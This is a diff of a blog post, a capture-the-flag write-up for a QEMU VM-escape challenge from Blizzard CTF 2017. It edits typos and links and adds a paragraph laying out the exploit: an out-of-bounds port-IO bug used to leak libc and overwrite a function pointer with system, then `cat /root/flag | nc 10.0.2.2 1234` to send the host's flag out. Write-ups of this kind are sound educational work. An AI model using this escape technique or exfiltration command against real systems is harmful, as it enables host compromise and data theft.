@@ -10,19 +10,19 @@ comments: true
 **Solves:** 0
 **Category:** Exploitation
 **Description:** Blizzard CTF 2017: Sombra True Random Number Generator (STRNG)
-Sombra True Random Number Generator (STRNG) is a QEMU-based challenge I developed for Blizzard CTF 2017. The challenge was to achieve a VM escape from a QEMU-based VM and capture the flag located at /root/flag on the host.
+Sombra True Random Number Generator (STRNG) is a QEMU-based challenge developed for Blizzard CTF 2017. The challenge was to achieve a VM escape from a QEMU-based VM and capture the flag located at /root/flag on the host.
 The image used and distributed with the challenge was the Ubuntu Server 14.04 LTS Cloud Image. The host used the same image as the guest. The guest was reset every 10 minutes and was started with the following command:
 ./qemu-system-x86_64 -m 1G -device strng -hda my-disk.img -hdb my-seed.img -nographic -L pc-bios/ -enable-kvm -device e1000,netdev=net0 -netdev user,id=net0,hostfwd=tcp::5555-:22
 Access to the guest was provided by redirecting incoming connections to the host on port 5555 to the guest on port 22.
 
 Username/password: ubuntu/passw0rd
 
-> [strng.tar.gz]({{site.url}}/assets/strng.tar.gz)
+> [strng.tar.gz](https://github.com/rcvalle/blizzardctf2017/raw/master/strng.tar.gz)
 
 
 ## Summary
 
-Since the end of Defcon Quals and the previous [EC3]({{site.url}}/exploitation/2018/05/13/DefconQuals-2018-EC3.html) blog post me and [aegis](https://twitter.com/lunixbochs) decided to tackle another QEMU VM escape challenge. The challenge is from last year's BlizzardCTF at Irvine California. Legendary challenges were incentivized with $1000 cash for the first solve however, no teams managed to solve this one during the competitition, which was 8 hours with multiple Legendary, Epic, Rare and Common tasks.
+Since the end of Defcon Quals and the previous [EC3]({{site.url}}/exploitation/2018/05/13/DefconQuals-2018-EC3.html) blog post me and [aegis](https://twitter.com/lunixbochs) decided to tackle another QEMU VM escape challenge. The challenge is from last year's BlizzardCTF at Irvine California. Legendary challenges were incentivized with $1000 cash for the first solve however, no teams managed to solve this one during the competition, which was 8 hours with multiple Legendary, Epic, Rare and Common tasks.
 
 The challenge revolves around exploiting an emulated hardware PCI device. The really cool part of this tasks is that you have to abuse not just the memory-mapped IO but also the port-mapped IO. Any read/write to the MMIO are handled by device's strng_mmio_read/write functions. Any read/write to the PMIO are handled by the device's strng_pmio_read/write functions. In short the device's registers contain a buffer and a couple of function pointers to srand, rand and rand_r. We have out-of-bound access bug from strng_pmio_write due to index buffer not being validated. The plan is to leak libc address and overwrite one of the function pointers with system@libc, then we can execute arbitrary commands on the host to retrieve the flag.
 
@@ -252,7 +252,7 @@ To access the MMIO we are going to use a modified version of [pcimem](https://gi
 
 ## PMIO
 
-From the recon phase we know the I/O ports are 8, 8 bytes mapped at `0xc050`. We can access them individually or multiple at a time. The `pmio_read/write` functions however, expect only 4 byte reads/writes. This means we only have 2 options, to read/write to address `0xc050` or `0xc054` which will make our addr argument either 0 or 4 so we can hit the approriate branch.
+From the recon phase we know the I/O ports are 8, 8 bytes mapped at `0xc050`. We can access them individually or multiple at a time. The `pmio_read/write` functions however, expect only 4 byte reads/writes. This means we only have 2 options, to read/write to address `0xc050` or `0xc054` which will make our addr argument either 0 or 4 so we can hit the appropriate branch.
 
 ### strng_pmio_read
 
@@ -322,7 +322,7 @@ So, writing to `0xc050` let's us store the offset address and writing to `0xc054
 
 Here are a few cool methods of accessing port I/O.
 
-### resourceX
+### sysfs resourceX
 
 We can read/write to the sysfs using dd, our own code or anything else that lets us read/write 4 bytes at a time from a file.
 
@@ -367,7 +367,7 @@ The trick here is that you have to give permission for your program to access th
 
 ## Exploit
 
-Now that we have everything layed out, I believe anybody can complete the exploit. But just for completeness here is a quick memory layout and the final script.
+Now that we have everything laid out, I believe anybody can complete the exploit. But just for completeness here is a quick memory layout and the final script.
 
 {% highlight text %}
 gdb-peda$ x/40gx $rdi+0xaf0
@@ -390,6 +390,8 @@ gdb-peda$ x/40gx $rdi+0xaf0
 0x555557e2ca50: 0x0000000000000000      0x00007ffff65268d0    # srand()
 0x555557e2ca60: 0x00007ffff6526f60      0x00007ffff6526f70    # rand(), rand_r()
 {% endhighlight %}
+
+The plan is to first leak libc by using `strng_pmio_read` and `strng_pmio_write`. `strng_pmio_write` can write the index to be read by the `strng_pmio_read` this way we can leak one of the 3 pointers stored in the emulated PCI Device address space. Then we are going to use the `strng_mmio_write` to store the command line we want to execute. And then we are going to overwrite the `rand_r` pointer with the address of `system@libc` because its called with the argument we control. And finally we are going to call the corrupted `rand_r` pointer. The command I chose is `cat /root/flag | nc 10.0.2.2 1234`.
 
 In my setup I use MacOS to host a vagrant box that runs the QEMU process which emulates the vulnerable PCI Device. We can grab the flag from the vagrant box by using a listen nc on the Mac.
 
@@ -509,7 +511,7 @@ int main(int argc, char* argv[])
 {% endhighlight %}
 
 
-### Special thanks to [aegis](https://twitter.com/lunixbochs) and the task author [rcvalle](https://twitter.com/rcvalle?lang=en) for helping me understand QEMU and IO emulation. Thanks for the challenge. :)
+> Special thanks to [aegis](https://twitter.com/lunixbochs) and the task author [rcvalle](https://twitter.com/rcvalle?lang=en) for helping me understand QEMU and IO emulation. Thanks for the challenge. :)
 
 ### Links and references
 * [Source of the task](https://github.com/rcvalle/blizzardctf2017) - The author only published this after the exploit was completed
